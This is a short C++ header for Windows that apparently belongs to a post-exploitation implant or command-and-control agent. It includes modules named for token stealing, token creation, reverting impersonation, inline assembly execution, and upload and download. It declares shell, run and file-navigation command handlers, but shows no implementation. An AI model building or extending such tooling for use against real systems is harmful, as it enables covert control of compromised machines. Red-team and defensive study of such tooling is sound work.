#pragma once
#include <Windows.h>
#include <string>
#include <vector>
#include "Helpers.h"
#include "Download.h"
#include "Upload.h"
#include "MakeToken.h"
#include "StealToken.h"
#include "Rev2Self.h"
#include "InlineAssembly.h"

std::string whoami(std::vector<std::string> arguments);
std::string shell(std::vector<std::string> arguments);
std::string run(std::vector<std::string> arguments);
std::string pwd(std::vector<std::string> arguments);
std::string Cd(std::vector<std::string> arguments);
std::string Ls(std::vector<std::string> arguments);